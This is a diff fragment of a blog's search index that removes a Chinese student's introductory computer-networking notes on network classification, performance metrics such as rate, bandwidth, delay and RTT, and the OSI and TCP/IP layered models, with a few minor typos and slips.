-    <content><![CDATA[<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="1-1-1-概念、组成、功能和分类"><a href="#1-1-1-概念、组成、功能和分类" class="headerlink" title="1.1.1 概念、组成、功能和分类"></a>1.1.1 概念、组成、功能和分类</h3><h4 id="计算机网络的概念："><a href="#计算机网络的概念：" class="headerlink" title="计算机网络的概念："></a>计算机网络的概念：</h4><p>​    计算机网络：是一个将分散的、具有独立功能的计算机系统。通过通信设备与线路连接起来，由功能完善的软件实现资源共享和信息传递的系统。</p>
-<p>​    计算机网络是<strong>互联的、自治的</strong>计算机集合。</p>
-<p>​        互联-互联互通 通信链路</p>
-<p>​        自治-无主从关系</p>
-<span id="more"></span>
-
-<h4 id="计算机网络的功能："><a href="#计算机网络的功能：" class="headerlink" title="计算机网络的功能："></a>计算机网络的功能：</h4><p>​    1数据通信（连通性）</p>
-<p>​    2资源共享    </p>
-<p>​         硬件    软件    数据</p>
-<p>​    3分布式处理    多台计算机各自承担同一工作任务的不同部分</p>
-<p>​    4提高可靠性(替代机)</p>
-<p>​    5负载均衡    各计算机之间更亲密</p>
-<h4 id="计算机网络的组成："><a href="#计算机网络的组成：" class="headerlink" title="计算机网络的组成："></a>计算机网络的组成：</h4><p>​    1组成部分：硬件、软件、协议</p>
-<p>​    2工作方式:</p>
-<p>​        边缘部分    用户直接使用（C/S方式；P2P方式）</p>
-<p>​        核心部分    为边缘部分服务</p>
-<p>​    3功能组成：</p>
-<img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/1.png" class="">
-
-<h6 id="资源子网-实现资源共享-数据处理"><a href="#资源子网-实现资源共享-数据处理" class="headerlink" title="资源子网    实现资源共享/数据处理"></a>资源子网    实现资源共享/数据处理</h6><p>​                实现资源共享功能的设备和软件的集合</p>
-<h6 id="通信子网-实现数据通信"><a href="#通信子网-实现数据通信" class="headerlink" title="通信子网    实现数据通信"></a>通信子网    实现数据通信</h6><p>​                各种传输介质、通讯设备、相应的网络协议组成</p>
-<h4 id="计算机网络的分类："><a href="#计算机网络的分类：" class="headerlink" title="计算机网络的分类："></a>计算机网络的分类：</h4><h6 id="1按分布范围分："><a href="#1按分布范围分：" class="headerlink" title="1按分布范围分："></a>1按分布范围分：</h6><p>​    广域网WAN    城域网MAN    局域网WAN    个人区域网PAN</p>
-<h6 id="2按使用者分："><a href="#2按使用者分：" class="headerlink" title="2按使用者分："></a>2按使用者分：</h6><p>​    公用网    专用网</p>
-<h6 id="3按交换技术分："><a href="#3按交换技术分：" class="headerlink" title="3按交换技术分："></a>3按交换技术分：</h6><p>​    电路交换    报文交换    分组交换</p>
-<h6 id="4按拓扑结构分："><a href="#4按拓扑结构分：" class="headerlink" title="4按拓扑结构分："></a>4按拓扑结构分：</h6><p>​    总线型    星型    环型    网状型</p>
-<h6 id="5按传输技术分："><a href="#5按传输技术分：" class="headerlink" title="5按传输技术分："></a>5按传输技术分：</h6><p>​    广播式网络（共享公共通信信道）</p>
-<p>​    点对点网络（使用分组存储转发和路由选择机制）</p>
-<h3 id="1-1-2-标准化工作及相关知识"><a href="#1-1-2-标准化工作及相关知识" class="headerlink" title="1.1.2 标准化工作及相关知识"></a>1.1.2 标准化工作及相关知识</h3><h4 id="标准换工作"><a href="#标准换工作" class="headerlink" title="标准换工作"></a>标准换工作</h4><h5 id="标准的分类："><a href="#标准的分类：" class="headerlink" title="标准的分类："></a>标准的分类：</h5><p>​        法定标准    由权威机构制定的正式的、合法的标准</p>
-<p>​        事实标准    某些公司的产品在竞争中占据了主流，时间长了，这些产品的协议和技术就成了标准</p>
-<h5 id="标准化工作："><a href="#标准化工作：" class="headerlink" title="标准化工作："></a>标准化工作：</h5><p>​        <strong>RFC</strong>    因特网标准的形式</p>
-<p>​        RFC要上升为因特网正式标准的<strong>四个阶段</strong>：</p>
-<p>​            1）因特网草案    这个阶段还不是RFC文档</p>
-<p>​            2）建议标准        这个阶段开始成为RFC文档</p>
-<p>​            3）草案标准        IETF、IAB认证</p>
-<p>​            4）因特网标准</p>
-<h4 id="标准化工作的相关组织"><a href="#标准化工作的相关组织" class="headerlink" title="标准化工作的相关组织"></a>标准化工作的相关组织</h4><p>​    国际标准化组织ISO</p>
-<p>​    国际电信联盟ITU</p>
-<p>​    国际电气电子工程师协会IEEE</p>
-<p>​    Internet工程任务组IETE</p>
-<h3 id="1-1-3-速率相关的性能指标"><a href="#1-1-3-速率相关的性能指标" class="headerlink" title="1.1.3 速率相关的性能指标"></a>1.1.3 速率相关的性能指标</h3><h4 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h4><p>​    速率即数据率或称数据传输率或比特率。</p>
-<p>​    比特    1/0    位</p>
-<p>​    连接在计算机网络上的主机在数字信道上传送熟虑位数的速率。</p>
-<p>​    单位b/s，kb/s，Mb/s，Gb/s，Tb/s</p>
-<img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/2.png" class="">
-
-<h4 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h4><p>​    ”带宽”原本指某个信号具有的<strong>频带宽度</strong>，即最高频率与最低速率之差，单位是赫兹（HZ）。</p>
-<p>​    计算机网络中，带宽用来表示网络的通讯线路传送数据的能力，通常是单位时间从网络的某一点到另一点所能通过的“<strong>最高数据率</strong>”。单位是“比特每秒”。网络设备所支持的最高速度。</p>
-<h4 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h4><p>​    表示<strong>单位时间</strong>内通过<strong>某个网络（或信道、接口）</strong>的数据量。单位是比特每秒。    </p>
-<p>​    吞吐量受网络的带宽或网络的额定速率的限制。</p>
-<h3 id="1-1-4-时延、时延带宽积、RTT和利用率"><a href="#1-1-4-时延、时延带宽积、RTT和利用率" class="headerlink" title="1.1.4 时延、时延带宽积、RTT和利用率"></a>1.1.4 时延、时延带宽积、RTT和利用率</h3><h4 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h4><p>​    指数据从<strong>网络（或链路）</strong>的一段传送到另一端所需的时间。也叫<strong>延迟</strong>或<strong>迟延</strong>。单位是s。</p>
-<img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/3.png" class="">
-
-<h4 id="时延带宽积"><a href="#时延带宽积" class="headerlink" title="时延带宽积"></a>时延带宽积</h4><p>​    时延带宽积=<strong>传播时延</strong>X<strong>带宽</strong></p>
-<p>​    又称为以比特为单位的链路长度</p>
-<h4 id="往返时延RTT"><a href="#往返时延RTT" class="headerlink" title="往返时延RTT"></a>往返时延RTT</h4><p>​    从发送方发送数据开始，到发送方收到接受方的确认，总共经历的时延。</p>
-<p>​    RTT越大，在收到确认之前，可以发送的数据越多。</p>
-<p>​    <img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/4.png" class=""></p>
-<h4 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h4><p>​    利用率分为信道利用率和网络利用率。</p>
-<h5 id="1-信道利用率"><a href="#1-信道利用率" class="headerlink" title="1.信道利用率"></a>1.信道利用率</h5><p>​            =有数据通过时间/（有+无）数据通过时间</p>
-<h5 id="2-网络利用率"><a href="#2-网络利用率" class="headerlink" title="2.网络利用率"></a>2.网络利用率</h5><p>​            =信道利用率加权平均值</p>
-<h4 id="1-2-1-分层结构、协议、接口、服务"><a href="#1-2-1-分层结构、协议、接口、服务" class="headerlink" title="1.2.1 分层结构、协议、接口、服务"></a>1.2.1 分层结构、协议、接口、服务</h4><h5 id="为什么要分层？"><a href="#为什么要分层？" class="headerlink" title="为什么要分层？"></a>为什么要分层？</h5><p>​        发送前要完成的工作：</p>
-<p>​            （1）发起通信的计算机必须将数据通信的通路进行激活。</p>
-<p>​            （2）要告诉网络如何识别目的主机。</p>
-<p>​            （3）发起通信的计算机要查明目的主机是否开机，并且与网络连接正常。</p>
-<p>​            （4）发起通信的计算机要弄清楚，对方计算机中文件管理程序是否已经做好准备工作。</p>
-<p>​            （5）确保差错和意外可以解决</p>
-<h5 id="怎么分层？"><a href="#怎么分层？" class="headerlink" title="怎么分层？"></a>怎么分层？</h5><h6 id="分层的基本原则："><a href="#分层的基本原则：" class="headerlink" title="分层的基本原则："></a>分层的<strong>基本原则</strong>：</h6><p>​        1.各层直接相互独立，每层只实现一种相对独立的功能</p>
-<p>​        2.各层之间界面自然清晰，易于理解，相互交流可能少</p>
-<p>​        3.结构上可分隔开。各层都采用最合适的技术实现</p>
-<p>​        4.保持下层对上层的独立性，上层单向使用下层提供的服务</p>
-<p>​        5.整个分层结构应该促进标准化工作</p>
-<h5 id="正式认识分层结构"><a href="#正式认识分层结构" class="headerlink" title="正式认识分层结构:"></a>正式认识分层结构:</h5><p>​        1.实体：第n层中的活动元素称为n层实体。同一层的实体叫对等实体。</p>
-<p>​        2.协议：为进行网络中的对等实体数据交换而建立的规则、标准或约定成为网络协议。</p>
-<p>​            <img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/5.png" class=""></p>
-<p>​        3.接口（访问服务点SAP）：上层使用下层的服务。</p>
-<p>​        4.服务：下层为相邻上层提供的功能调用。【垂直】</p>
-<h5 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结:"></a>概念总结:</h5><p>​        网络体系结构是从功能上描述计算机网络结构。</p>
-<p>​        计算机网络体系结构简称网络体系结构是分层结构。</p>
-<p>​        每层遵守某个/些网络协议以完成本层功能。</p>
-<p>​        计算机网络体系结构是计算机网路的各层及其协议的集合。</p>
-<p>​        第n层在向n+1层提供服务时，此服务不仅包含第n层本身的功能，还包含由下层服务提供的功能。</p>
-<p>​        仅仅在在相邻层间有接口，且所提供服务的具体实现细节对上一层完全屏蔽。</p>
-<p>​        体系结构是抽象的，而实现是指能运行的一些软件和硬件。</p>
-<h4 id="1-2-2-OSI参考模型"><a href="#1-2-2-OSI参考模型" class="headerlink" title="1.2.2 OSI参考模型"></a>1.2.2 OSI参考模型</h4><p>​    <img src="C:\Users\86189\blog\source\_posts\6.png" style="zoom:50%;" /></p>
-<h5 id="ISO-OSI参考模型–怎么来的？"><a href="#ISO-OSI参考模型–怎么来的？" class="headerlink" title="ISO/OSI参考模型–怎么来的？"></a>ISO/OSI参考模型–怎么来的？</h5><p>​        为了解决计算机网络复杂的大问题=》分层结构（按功能）</p>
-<p>​        目的：支持异构网络系统的互联互通。</p>
-<p>​        国际标准化组织（ISO）于1984年提出开放系统互连（OSI）参考模型。</p>
-<img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/7.png" class="">
-
-<h5 id="ISO-OSI参考模型"><a href="#ISO-OSI参考模型" class="headerlink" title="ISO/OSI参考模型"></a>ISO/OSI参考模型</h5><img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/8.png" class="">
-
-<h4 id="1-2-3-OSI参考模型（2）"><a href="#1-2-3-OSI参考模型（2）" class="headerlink" title="1.2.3 OSI参考模型（2）"></a><img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/9.png" class="">1.2.3 OSI参考模型（2）</h4><h5 id="应用层："><a href="#应用层：" class="headerlink" title="应用层："></a>应用层：</h5><p>​            所有能和用户产生网络流量的程序</p>
-<p>​            典型应用层服务：</p>
-<p>​                文件传输（FTP）</p>
-<p>​                电子邮件（SMTP）</p>
-<p>​                万维网（HTTP）</p>
-<p>​                ······</p>
-<h5 id="表示层："><a href="#表示层：" class="headerlink" title="表示层："></a>表示层：</h5><p>​            用于处理两个通信系统中变换消息的表示方式（语法和语义）</p>
-<p>​                功能一：数据格式变换</p>
-<p>​                功能二：数据加密解密</p>
-<p>​                功能三：数据压缩和恢复</p>
-<p>​            主要协议：JPEG，ASCII</p>
-<h5 id="会话层："><a href="#会话层：" class="headerlink" title="会话层："></a>会话层：</h5><p>​            向表示层实体/用户进程提供建立连接并在连接上有序地传输数据。</p>
-<p>​                这是会话，也是<strong>建立同步</strong>（SYN）</p>
-<p>​            功能一：建立、管理、终止会话</p>
-<p>​            功能二：使用校验点可使会话在通信失效时从校验点/同步点继续回复通信，实现数据同步。</p>
-<h5 id="传输层："><a href="#传输层：" class="headerlink" title="传输层："></a>传输层：</h5><p>​            负责主机中两个进程的通信，即端到端的通信。传输单位是<strong>报文段</strong>或<strong>用户数据报</strong>。</p>
-<p>​                功能一：可靠传输、不可靠传输</p>
-<p>​                功能二：差错控制</p>
-<p>​                功能三：流量控制</p>
-<p>​                功能四：复用分用</p>
-<p>​                                <strong>复用</strong>：多个应用层进程可同时使用下面运输层的服务。</p>
-<p>​                                <strong>分用</strong>：运输层把收到的信息分别交付到上面应用层中相应的进程。</p>
-<p>​            </p>
-<h5 id="网络层："><a href="#网络层：" class="headerlink" title="网络层："></a>网络层：</h5><p>​            主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务。网络层传输单位是<strong>数据报</strong>。</p>
-<p>​                功能一：路由选择    为了找到数据传输和的<strong>最佳路径</strong></p>
-<p>​                功能二：流量控制</p>
-<p>​                功能三：差错控制</p>
-<p>​                功能四：拥塞控制</p>
-<h5 id="数据链路层："><a href="#数据链路层：" class="headerlink" title="数据链路层："></a>数据链路层：</h5><p>​            主要任务是把网络层传下来的数据报组装成<strong>帧</strong>。数据链路层的传输单位是<strong>帧</strong>。</p>
-<p>​                功能一：成帧（<strong>定义帧的开始和结束</strong>）</p>
-<p>​                功能二：差错控制 <strong>帧错+位错</strong></p>
-<p>​                功能三：流量控制</p>
-<p>​                功能四：访问（接入）控制 <strong>控制对信道的访问</strong></p>
-<h5 id="物理层："><a href="#物理层：" class="headerlink" title="物理层："></a>物理层：</h5><p>​            主要任务是在物理媒体上实现比特流的<strong>透明传输</strong>。物理层传输单位是<strong>比特</strong>。</p>
-<p>​            物理层传输单位是比特。</p>
-<p>​                功能一：定义接口特性</p>
-<p>​                功能二：定义传输模式     <strong>单工</strong>、<strong>半双工</strong>、<strong>双工</strong></p>
-<p>​                功能三：定义传输速率</p>
-<p>​                功能四：比特同步</p>
-<p>​                功能五：比特编码</p>
-<h4 id="1-2-4-TCP、IP参考模型和5层参考模型"><a href="#1-2-4-TCP、IP参考模型和5层参考模型" class="headerlink" title="1.2.4 TCP、IP参考模型和5层参考模型"></a>1.2.4 TCP、IP参考模型和5层参考模型</h4><h5 id="OSI参考模型与TCP-IP参考模型"><a href="#OSI参考模型与TCP-IP参考模型" class="headerlink" title="OSI参考模型与TCP/IP参考模型"></a>OSI参考模型与TCP/IP参考模型</h5><img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/10.png" class="">
-
-<h6 id="OSI参考模型与TCP-IP参考模型的相同点"><a href="#OSI参考模型与TCP-IP参考模型的相同点" class="headerlink" title="OSI参考模型与TCP/IP参考模型的相同点"></a>OSI参考模型与TCP/IP参考模型的相同点</h6><p>​            1.都分层</p>
-<p>​            2.基于独立的协议栈的概念</p>
-<p>​            3可以实现异构网络互联</p>
-<h6 id="OSI参考模型与TCP-IP参考模型的不同点"><a href="#OSI参考模型与TCP-IP参考模型的不同点" class="headerlink" title="OSI参考模型与TCP/IP参考模型的不同点"></a>OSI参考模型与TCP/IP参考模型的不同点</h6><p>​            1.OSI定义三点：<strong>服务、协议、接口</strong></p>
-<p>​            2.OSI先出现，参考模型先于协议发明，不偏向特定协议</p>
-<p>​            3.TCP/IP设计之初就考虑到互联网异构问题，将IP作为重要层次</p>
-<p>​        <img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/11.png" class=""></p>
-<p>​            <strong>面向连接</strong>：第一是建立连接，发出一个建立连接的请求。第二阶段开始传输数据。最后传输完毕，必须释放连接。</p>
-<p>​            <strong>无连接</strong>：直接进行数据传输。</p>
-<h5 id="五层参考模型"><a href="#五层参考模型" class="headerlink" title="五层参考模型"></a>五层参考模型</h5><h5 id=""><a href="#" class="headerlink" title=""></a><img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/12.png" class=""></h5><h4 id="5层参考模型的数据封装与解封装"><a href="#5层参考模型的数据封装与解封装" class="headerlink" title="5层参考模型的数据封装与解封装"></a>5层参考模型的数据封装与解封装</h4><img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/13.png" class="">
-]]></content>
-      <categories>
-        <category>计算机网络</category>
       </categories>
   </entry>
 </search>
